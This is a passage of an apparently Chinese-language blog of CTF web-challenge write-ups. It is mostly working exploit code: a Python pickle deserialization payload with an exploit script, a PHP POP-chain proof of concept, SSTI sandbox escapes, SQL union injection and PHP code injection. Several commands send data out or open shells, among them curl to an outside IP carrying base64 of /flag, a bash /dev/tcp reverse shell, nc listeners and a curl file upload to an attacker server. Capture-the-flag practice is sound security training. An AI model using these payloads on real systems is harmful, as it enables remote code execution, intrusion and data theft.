class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.py</span></span><br><span class="line">notadmin=&#123;<span class="string">&quot;admin&quot;</span>:<span class="string">&quot;no&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">if</span> notadmin[<span class="string">&quot;admin&quot;</span>]==<span class="string">&quot;yes&quot;</span>:</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">eval</span>(s)</span><br></pre></td></tr></table></figure>
<p>处理的是参数name的值，先将传入值base64解码，然后用load方法将对象反序列化</p>
<p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvODM0MiN0b2MtMQ==">Pickle反序列化源码分析与漏洞利用</span></p>
<p>由于反序列化过程是完全可控的，因此利用这一漏洞进行绕过<code>config.py</code>中的<code> notadmin[&quot;admin&quot;]==&quot;yes&quot;</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cconfig</span><br><span class="line">notadmin</span><br><span class="line">S<span class="string">&quot;admin&quot;</span></span><br><span class="line">S<span class="string">&quot;yes&quot;</span></span><br><span class="line">s0</span><br></pre></td></tr></table></figure>

<p>先使用c操作码引入全局变量:config模块里面的<code>notadmin</code>，然后使用s操作码进行覆盖</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cconfig</span><br><span class="line">notadmin</span><br><span class="line">S<span class="string">&quot;admin&quot;</span></span><br><span class="line">S<span class="string">&quot;yes&quot;</span></span><br><span class="line">s0(S<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl http://ip:8085/?flagIs-$(cat /flag | base64)&#x27;)&quot;</span></span><br><span class="line">iconfig</span><br><span class="line">backdoor</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>经过base64编码再传入</p>
<p>服务器监听8085端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8085</span><br></pre></td></tr></table></figure>

<p>发包，即可进行命令执行并将执行命令的结果通过curl传到自己监听的端口</p>
<p>exp</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&quot;&quot;&quot;cconfig</span></span><br><span class="line"><span class="string">notadmin</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">S&quot;yes&quot;</span></span><br><span class="line"><span class="string">s0(S&quot;__import__(&#x27;os&#x27;).system(&#x27;curl http://47.107.56.244:8085/?flagIs-$(cat /flag | base64)&#x27;)&quot;</span></span><br><span class="line"><span class="string">iconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;?name=&#x27;</span> + base64.b64encode(data).decode()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://124.71.183.254:32770/&#x27;</span></span><br><span class="line"></span><br><span class="line">requests.get(url=url+payload)</span><br></pre></td></tr></table></figure>


<h1 id="魔法世界"><a href="#魔法世界" class="headerlink" title="魔法世界"></a>魔法世界</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="WELCOME-DASCTFxJlenu"><a href="#WELCOME-DASCTFxJlenu" class="headerlink" title="WELCOME DASCTFxJlenu"></a>WELCOME DASCTFxJlenu</h3><p>nc node4.buuoj.cn 25924</p>
<p>本以为就是签到题（也确实是），结果试了几分钟，输入个str时输出个</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>感觉到这是python脚本，直接用模板注入的方法进行文件查看，接着使用一个存在引入os模块的方法进行命令执行</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用&lt;type &#x27;file&#x27;&gt;进行文件读取</span></span><br><span class="line"></span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;talk.py&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用&lt;class &#x27;site._Printer&#x27;&gt;或 &lt;class &#x27;site.Quitter&#x27;&gt;执行os的system方法命令执行</span></span><br><span class="line"></span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line"></span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h3><p>本地试了下，发现可以直接拼接执行</p>
<p>GET :<code>?attrid[0]=a&amp;attrvalue[0]=&quot;)-phpinfo()-(&quot;</code></p>
<p>发现什么过滤都没有</p>
<p>GET :<code>?attrid[0]=a&amp;attrvalue[0]=&quot;)-system(&#39;ls&#39;)-(&quot;</code></p>
<p>无</p>
<p>GET :<code>?attrid[0]=a&amp;attrvalue[0]=&quot;)-system(&#39;ls /&#39;)-(&quot;</code></p>
<p>发现flag.sh</p>
<p>GET :<code>?attrid[0]=a&amp;attrvalue[0]=&quot;)-system(&#39;cat /flag.sh&#39;)-(&quot;</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash </span></span><br><span class="line">TZ=<span class="string">&quot;Tokyo <span class="variable">$FLAG</span>&quot;</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Tokyo <span class="variable">$FLAG</span>&quot;</span> &gt; /etc/timezone </span><br><span class="line"><span class="built_in">export</span> FLAG=not_here </span><br><span class="line">FLAG=not_here </span><br></pre></td></tr></table></figure>
<p>找到flag的位置</p>
<p>GET :<code>?attrid[0]=a&amp;attrvalue[0]=&quot;)-system(&#39;cat /etc/timezone&#39;)-(&quot;</code></p>
<h1 id="geek2021"><a href="#geek2021" class="headerlink" title="geek2021"></a>geek2021</h1><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>直接联合查询注入，一共查询了四个字段，显示第一第二个字段，查到库flag，表fllag，列名fllllllag</p>
<p>最后直接：</p>
<blockquote>
<p>uname&#x3D;admin&amp;pwd&#x3D;1’union%20select%201,(select%20group_concat(fllllllag)from%20flag.fllag),3,4#&amp;wp-submit&#x3D;functio</p>
</blockquote>
<h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$Do_u_like_JiaRan</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$Do_u_like_AFKL</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$i_want_2_listen_2_MaoZhongDu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a::<span class="variable">$Do_u_like_AFKL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">exec</span>(<span class="variable language_">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        a::<span class="variable">$Do_u_like_JiaRan</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        a::<span class="variable">$Do_u_like_AFKL</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;关注嘉然,&quot;</span> . <span class="variable language_">$this</span>-&gt;value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a::<span class="variable">$Do_u_like_JiaRan</span>) &#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;afkl)();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>简单反序列化，直接找利用链然后造poc:</p>
<p>直接从类c开始，使得静态变量为true，然后在c里面创建一个e类对象进入类e，通过判断，调用afkl方法，将afkl赋值为新建的d类对象，触发魔术方法__invoke，这里第二个静态变量赋值为true，并且将返回字符串value，将value赋值为新建b类对象，触发魔术方法__toString，通过判断，执行exec函数，参数可控，执行任意命令，无回显，直接curl或者弹shell都行，我是直接curl将文件内容通过base64带出，服务器nc监听，最终得到flag</p>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$Do_u_like_JiaRan</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$Do_u_like_AFKL</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$i_want_2_listen_2_MaoZhongDu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;i_want_2_listen_2_MaoZhongDu = <span class="string">&#x27;curl http://服务器ip:端口/?flagIs-$(cat /flag | base64)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$muhua</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        a::<span class="variable">$Do_u_like_JiaRan</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value=<span class="keyword">new</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">e</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$afkl</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">               <span class="variable language_">$this</span>-&gt;afkl=<span class="keyword">new</span> d;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$muhua</span> = <span class="keyword">new</span> c;</span><br><span class="line"></span><br><span class="line"><span class="variable">$muhua</span>-&gt;muhua = <span class="keyword">new</span> e;</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$muhua</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$out</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$out</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$out</span>);</span><br></pre></td></tr></table></figure>
<h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chijou_kega_no_junnka</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$black_list</span> = [<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot; &quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$black_list</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;DATA&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;DATA&#x27;</span>];</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">chijou_kega_no_junnka</span>(<span class="variable">$data</span>[<span class="string">&#x27;ADDR&#x27;</span>]);</span><br><span class="line">    <span class="variable">$port</span> = <span class="title function_ invoke__">chijou_kega_no_junnka</span>(<span class="variable">$data</span>[<span class="string">&#x27;PORT&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&quot;bash -c \&quot;bash -i &lt; /dev/tcp/<span class="subst">$addr</span>/<span class="subst">$port</span>\&quot;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接可以弹shell，可以通过</p>
<blockquote>
<p>?DATA[ADDR]&#x3D;服务器ip&amp;DATA[PORT]&#x3D;端口1</p>
</blockquote>
<p>但它只能让我执行，看不到回显，不过够了</p>
<blockquote>
<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器ip&#x2F;端口2 0&gt;&amp;1</p>
</blockquote>
<p>于是在第二个端口进行访问，图片超级大，一个屏幕装不下，但有curl，于是直接传：然后是需要的知识</p>
<blockquote>
<p>-F参数用来向服务器上传二进制文件。</p>
</blockquote>
<blockquote>
<p>$ curl -F ‘file&#x3D;@photo.png’ <span class="exturl" data-url="aHR0cHM6Ly9nb29nbGUuY29tL3Byb2ZpbGU=">https://google.com/profile</span><br>上面命令会给 HTTP 请求加上标头Content-Type: multipart&#x2F;form-data，然后将文件photo.png作为file字段上传。</p>
</blockquote>
<p>-F参数可以指定 MIME 类型。</p>
<p>$ curl -F ‘file&#x3D;@photo.png;type&#x3D;image&#x2F;png’ <span class="exturl" data-url="aHR0cHM6Ly9nb29nbGUuY29tL3Byb2ZpbGU=">https://google.com/profile</span><br>上面命令指定 MIME 类型为image&#x2F;png，否则 curl 会把 MIME 类型设为application&#x2F;octet-stream。</p>
<p>-F参数也可以指定文件名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -F &#x27;file=@photo.png;filename=me.png&#x27; https://google.com/profile</span><br><span class="line">上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。</span><br></pre></td></tr></table></figure>

<p>开第三个端口进行监听：</p>
<blockquote>
<p>nc -lvvp 端口3 &gt;flag.txt</p>
</blockquote>
<p>端口2执行：</p>
<blockquote>
<p>curl -F ‘file&#x3D;@flag.png’ <span class="exturl" data-url="aHR0cDovLzQ3LjEwNy41Ni4yNDQ6ODA4Ni8=">http://47.107.56.244:8086</span></p>
</blockquote>
<p>默默等待，然后传输完成，将文件传到本地，010打开，将png图片头格式之前的东西都删掉，改后缀为png，打开图片即显示flag</p>
<p>如果不会crul，或许你需要一点小小的帮助：<span class="exturl" data-url="aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMTkvMDkvY3VybC1yZWZlcmVuY2UuaHRtbA==">点击进入curl指令学习</span></p>
<h2 id="babypy"><a href="#babypy" class="headerlink" title="babypy"></a>babypy</h2><p>模板注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[1].__subclasses__()</span><br><span class="line"></span><br><span class="line">直接查询到第213个是Popen函数，命令执行：</span><br><span class="line">&#123;&#123;[].__class__.__mro__[1].__subclasses__()[213](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0]&#125;&#125;</span><br><span class="line"></span><br><span class="line">直接读取文件</span><br><span class="line">&#123;&#123;[].__class__.__mro__[1].__subclasses__()[213](&#x27;cat flag&#x27;,shell=True,stdout=-1).communicate()[0]&#125;&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP is the best Language &lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Have you ever heard about PHP Black Magic&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$temp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="variable">$temp</span>)?<span class="keyword">die</span>(<span class="string">&quot;no way&quot;</span>):<span class="literal">NULL</span>;    </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$temp</span>&gt;<span class="number">9999</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./2.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;How&#x27;s that possible&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//Art is long, but life is short. So I use PHP.</span></span><br><span class="line"><span class="comment">//I think It`s So useful that DiaoRen Said;</span></span><br><span class="line"><span class="comment">//why not they use their vps !!!</span></span><br><span class="line"><span class="comment">//BBTZ le jiarenmen</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>弱类型比较直接绕：</p>
<blockquote>
<p>?password&#x3D;1e9a</p>
</blockquote>
<p>查看页面源码，php文件读取php文件常常是以页面源码形式出现</p>
<blockquote>
<p>baby_magic.php<br>访问:</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no no no no way for you to do so.&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;G1ve u the flag&#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;not right&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Just g1ve it a try.&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>数组绕过</p>
<blockquote>
<p>?user[0]&#x3D;a&amp;pass[0]&#x3D;1</p>
</blockquote>
<p>得到</p>
<blockquote>
<p>baby_revenge.php<br>访问</p>
</blockquote>
